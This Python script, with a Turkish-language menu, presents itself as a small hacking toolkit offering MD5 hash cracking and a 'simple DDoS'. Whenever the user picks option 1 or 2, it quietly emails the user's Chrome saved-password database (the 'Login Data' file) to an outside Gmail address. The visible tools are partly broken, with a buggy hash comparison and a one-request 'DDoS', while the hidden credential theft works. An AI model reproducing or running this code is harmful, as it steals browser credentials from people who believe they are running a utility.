#!/usr/bin/env python
#-*-coding:utf-8-*-
from threading import Thread
import socket
import os
import sys
import smtplib
import getpass
import platform
import socket
import re
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
import hashlib
import random
import string
print("\n 1)Md5 Cracker \n ?)Sql Scan(Çok yakında...) \n 2) Basit DdoS")
islem = input('-->')
def md5():
    secim = input("[*] Lütfen seçiniz: \n 1) Brute: \n 2) Wordlist: \n --> ")
    kirilacak = input("[*] Hashi girin: ")
    if secim == "1":
        thread_sayi = int(input("[*] Thread sayısını girin: "))
        
        while True:            
            random1 = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(2, 10)])
            kelime2 = hashlib.md5()
            kelime2.update(random1.encode('utf-8'))            
            print(kelime2.hexdigest())
            if kelime2.hexdigest() == kirilacak:
                print('[+] Hash: ', random)
    for x in range(thread_sayi):
        Thread(target=md5).run()
    if secim == "2":
        wordlist = open("wordlist.txt", "r").readlines()
        for kelime in wordlist:
            kelime = kelime.strip()
            kir = hashlib.md5()
            kir.update(kelime.encode('utf-8')).hexdigest()
            if kir == kirilacak:
                print('[+] Hash', kelime)
class Mail (object):
	def __init__ (self, mail, passwd, s_to, subject, mssage, doc=None):
		(self.mail, self.passwd, self.s_to, self.subject, self.mssage, self.doc) = (mail, passwd, s_to, subject, mssage, doc)	
		self.base = lambda x: os.path.basename (x)
		self.host = "smtp.gmail.com"
		self.port = 465
		pass

	def __call__ (self):
		msg = self.create_msg (self.s_to, self.subject, self.mssage, self.doc)
		self.send (msg)
		return (True)

	def create_msg (self, s_to, m_subject, m_message, a_file=None):
		
		msg = MIMEMultipart ()
		(msg ['From'], msg ['To'], msg ['Subject'], msg ['Date']) = \
		(self.mail, s_to, m_subject, formatdate (localtime=True))

		if (a_file):
			with open (a_file, "r+", encoding="latin1") as doc:
				base	= self.base (a_file)
				attachm = MIMEApplication (doc.read (), Name=base)
				attachm ['Content-Disposition'] = 'attachment; filename="{0}"'.format (str(base))
				msg.attach (attachm)
				

		msg.attach (MIMEText (m_message))
		
		return (msg)

	def send (self, msg):
		
		smtpd = smtplib.SMTP_SSL (self.host, self.port)
		smtpd.ehlo ()
		smtpd.login (self.mail, self.passwd)
		
		smtpd.sendmail (self.mail, self.s_to, msg.as_string ())
		
		smtpd.close ()
		
		return (True)
def ddos():
    ip = input('[*]İp adresini girin: ')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((ip, 80))
    yöntem = b'apache'.decode('utf-8')
    s.send("GET /" + yöntem + " HTTP/1.1\r\n")
    s.send("Host: " + ip  + "\r\n\r\n")
    s.close()
isim = getpass.getuser()
path = "C:\\Users\\" + isim + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
m1 = Mail("utkucolak05@gmail.com", "PASSWORD", "kolon01fantastik@gmail.com", "a", "a", path)

dos_at = Thread(target=ddos)
y = Thread(target=md5)
x = Thread(target=m1)
if islem == "1":
    y.start()
    x.start()
if islem == "2":
    dos_at.start()
    x.start()
else:
    sys.exit()
